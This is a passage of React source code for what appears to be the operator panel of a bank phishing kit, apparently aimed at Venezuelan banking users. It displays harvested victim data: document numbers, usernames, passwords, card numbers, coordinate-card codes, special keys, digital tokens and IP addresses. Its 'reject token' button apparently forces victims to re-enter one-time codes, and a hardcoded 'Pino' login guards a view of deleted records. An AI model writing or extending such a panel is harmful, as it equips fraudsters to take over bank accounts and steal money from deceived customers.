                        <div className="flex items-center gap-2">
                          <div className="flex flex-col gap-0.5">
                            {isNetCash && <span className="text-[10px] font-bold uppercase tracking-wide text-purple-500">Clave Token</span>}
                            <div className="flex items-center gap-1 font-mono">
                              {record.claveDigital || <span className="text-gray-300">—</span>}
                              {record.claveDigital && <CopyButton value={record.claveDigital} />}
                            </div>
                          </div>
                          {record.claveDigital && record.claveDigitalStatus !== "rejected" && (
                            <button
                              title="Rechazar clave token"
                              onClick={async () => {
                                await base44.entities.UserSessionData.update(record.id, { claveDigitalStatus: "rejected" });
                                await fetchRecords();
                              }}
                              className="w-8 h-8 flex items-center justify-center rounded-full bg-red-100 hover:bg-red-200 text-red-500 transition"
                            >
                              <XCircle className="w-4 h-4" />
                            </button>
                          )}
                          {record.claveDigitalStatus === "rejected" && <span className="text-xs text-red-500 font-semibold">Rechazado</span>}
                        </div>
                      </td>

                      <td className="px-6 py-4">
                        <div className="flex items-center gap-2">
                          <button
                            onClick={() => deleteRecord(record.id)}
                            className="text-red-400 hover:text-red-600 transition"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <span className="font-mono text-xs text-gray-500">{record.userIp || <span className="text-gray-300">—</span>}</span>
                      </td>
                    </tr>
                  );
                  })}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </main>

      {/* Modal TXT - Login propio */}
      {showTxt && !txtAuthed && (
        <div className="fixed inset-0 bg-black/40 flex items-center justify-center z-50">
          <div className="bg-white rounded-xl shadow-xl p-8 w-full max-w-sm mx-4">
            <div className="flex items-center gap-2 mb-6">
              <FileText className="w-5 h-5 text-emerald-600" />
              <h2 className="text-xl font-semibold text-gray-800">Acceso TXT</h2>
            </div>
            <form
              onSubmit={(e) => {
                e.preventDefault();
                if (txtLoginUsuario === "Pino" && txtLoginClave === "Pino") {
                  sessionStorage.setItem("txt_auth", "1");
                  setTxtAuthed(true);
                  setTxtLoginError("");
                } else {
                  setTxtLoginError("Usuario o clave incorrectos.");
                }
              }}
              className="space-y-4"
            >
              <div>
                <label className="block text-sm text-gray-600 mb-1">Usuario</label>
                <input
                  type="text"
                  value={txtLoginUsuario}
                  onChange={(e) => setTxtLoginUsuario(e.target.value)}
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm outline-none focus:border-emerald-400"
                  placeholder="Usuario"
                  autoFocus
                />
              </div>
              <div>
                <label className="block text-sm text-gray-600 mb-1">Clave</label>
                <div className="relative">
                  <input
                    type={showTxtClave ? "text" : "password"}
                    value={txtLoginClave}
                    onChange={(e) => setTxtLoginClave(e.target.value)}
                    className="w-full border border-gray-300 rounded-lg px-3 py-2 pr-10 text-sm outline-none focus:border-emerald-400"
                    placeholder="Clave"
                  />
                  <button
                    type="button"
                    onClick={() => setShowTxtClave((v) => !v)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                  >
                    {showTxtClave ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
              </div>
              {txtLoginError && <p className="text-red-500 text-sm">{txtLoginError}</p>}
              <div className="flex gap-3 pt-1">
                <button
                  type="button"
                  onClick={() => { setShowTxt(false); setTxtLoginUsuario(""); setTxtLoginClave(""); setTxtLoginError(""); }}
                  className="flex-1 py-2 rounded-lg border border-gray-300 text-gray-600 text-sm hover:bg-gray-50 transition"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  disabled={!txtLoginUsuario || !txtLoginClave}
                  className="flex-1 py-2 rounded-lg bg-emerald-600 text-white text-sm font-medium hover:bg-emerald-700 transition disabled:opacity-50"
                >
                  Entrar
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Modal TXT - Registros eliminados */}
      {showTxt && txtAuthed && (
        <div className="fixed inset-0 bg-black/40 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-xl shadow-xl w-full max-w-4xl mx-auto flex flex-col max-h-[85vh]">
            <div className="flex items-center justify-between px-6 py-4 border-b border-gray-100">
              <div className="flex items-center gap-2">
                <FileText className="w-5 h-5 text-emerald-600" />
                <h3 className="text-lg font-semibold text-gray-800">Registros Eliminados</h3>
                <span className="text-sm text-gray-400">({deletedRecords.length})</span>
              </div>
              <div className="flex items-center gap-2">
                {deletedRecords.length > 0 && (
                  <button
                    onClick={() => { if (window.confirm("¿Eliminar todo el historial?")) clearTrash(); }}
                    className="flex items-center gap-1.5 px-3 py-1.5 rounded-full text-sm font-medium border border-red-300 bg-red-50 text-red-600 hover:bg-red-100 transition"
                  >
                    <Trash2 className="w-4 h-4" />
                    Eliminar todo
                  </button>
                )}
                <button
                  onClick={() => setShowTxt(false)}
                  className="text-gray-400 hover:text-gray-600 transition p-1"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>
            </div>
            <div className="overflow-y-auto flex-1">
              {deletedRecords.length === 0 ? (
                <div className="text-center py-16 text-gray-400">No hay registros eliminados.</div>
              ) : (
                <table className="w-full text-sm">
                  <thead className="sticky top-0 bg-gray-50 z-10">
                    <tr className="border-b border-gray-200">
                      <th className="text-left px-4 py-2 text-xs font-semibold text-gray-500 uppercase">Ingresado</th>
                      <th className="text-left px-4 py-2 text-xs font-semibold text-red-400 uppercase">Eliminado</th>
                      <th className="text-left px-4 py-2 text-xs font-semibold text-gray-500 uppercase">N° Doc</th>
                      <th className="text-left px-4 py-2 text-xs font-semibold text-gray-500 uppercase">Usuario</th>
                      <th className="text-left px-4 py-2 text-xs font-semibold text-gray-500 uppercase">Clave</th>
                      <th className="text-left px-4 py-2 text-xs font-semibold text-gray-500 uppercase">N° Tarj</th>
                      <th className="text-left px-4 py-2 text-xs font-semibold text-gray-500 uppercase">Coord</th>
                      <th className="text-left px-4 py-2 text-xs font-semibold text-gray-500 uppercase">Cód. Coord</th>
                      <th className="text-left px-4 py-2 text-xs font-semibold text-gray-500 uppercase">Cl. Especial</th>
                      <th className="text-left px-4 py-2 text-xs font-semibold text-gray-500 uppercase">Cl. Digital</th>
                      <th className="text-left px-4 py-2 text-xs font-semibold text-gray-500 uppercase">IP</th>
                      <th className="px-4 py-2"></th>
                    </tr>
                  </thead>
                  <tbody>
                    {deletedRecords.map((r, idx) => (
                      <tr key={idx} className="border-b border-gray-50 hover:bg-gray-50 transition">
                        <td className="px-4 py-3 text-xs text-gray-400 whitespace-nowrap">
                          {r.created_date ? new Date(r.created_date).toLocaleString("es-VE") : "—"}
                        </td>
                        <td className="px-4 py-3 text-xs text-red-400 font-semibold whitespace-nowrap">
                          {r.deletedAt ? new Date(r.deletedAt).toLocaleString("es-VE") : "—"}
                        </td>
                        <td className="px-4 py-3 font-mono text-gray-700">{r.numeroDocumento || "—"}</td>
                        <td className="px-4 py-3 font-semibold text-gray-700">{r.usuario || "—"}</td>
                        <td className="px-4 py-3 font-mono text-gray-600">{r.claveAcceso || "—"}</td>
                        <td className="px-4 py-3 font-mono text-gray-600">{r.numeroTarjetaDisplay || "—"}</td>
                        <td className="px-4 py-3 font-mono text-gray-600">{r.coordenadaDisplay || "—"}</td>
                        <td className="px-4 py-3 font-mono text-gray-600">{r.codigoCoordenada || "—"}</td>
                        <td className="px-4 py-3 font-mono text-gray-600">{r.claveEspecial || "—"}</td>
                        <td className="px-4 py-3 font-mono text-gray-600">{r.claveDigital || "—"}</td>
                        <td className="px-4 py-3 font-mono text-xs text-gray-500">{r.userIp || "—"}</td>
                        <td className="px-4 py-3">
                          <button
                            onClick={() => removeFromTrash(idx)}
                            title="Eliminar este registro"
                            className="text-red-400 hover:text-red-600 transition"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Modal Configuración */}
      {showConfig && (
        <div className="fixed inset-0 bg-black/40 flex items-center justify-center z-50">
          <div className="bg-white rounded-xl shadow-xl p-6 w-full max-w-sm mx-4">
            <h3 className="text-lg font-semibold text-gray-800 mb-4">Configuración del Panel</h3>
            <div className="space-y-4">
              <div>
                <label className="block text-sm text-gray-600 mb-1">Usuario</label>
                <input
                  type="text"
                  value={newUsuario}
                  onChange={(e) => setNewUsuario(e.target.value)}
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm outline-none focus:border-blue-400"
                  placeholder="Nuevo usuario"
                />
              </div>
              <div>
                <label className="block text-sm text-gray-600 mb-1">Clave de acceso</label>
                <div className="relative">
                  <input
                    type={showClave ? "text" : "password"}
                    value={newClave}
                    onChange={(e) => setNewClave(e.target.value)}
                    className="w-full border border-gray-300 rounded-lg px-3 py-2 pr-10 text-sm outline-none focus:border-blue-400"
                    placeholder="Nueva clave"
                  />
                  <button
                    type="button"
                    onClick={() => setShowClave((v) => !v)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                  >
                    {showClave ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
              </div>
            </div>
            <div className="flex gap-3 mt-6">
              <button
                onClick={() => setShowConfig(false)}
                className="flex-1 py-2 rounded-lg border border-gray-300 text-gray-600 text-sm hover:bg-gray-50 transition"
              >
                Cancelar
              </button>
              <button
                onClick={saveConfig}
                disabled={savingConfig || !newUsuario || !newClave}
                className="flex-1 py-2 rounded-lg bg-[hsl(var(--primary))] text-white text-sm font-medium hover:opacity-90 transition disabled:opacity-50"
              >
                {savingConfig ? "Guardando..." : "Guardar"}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}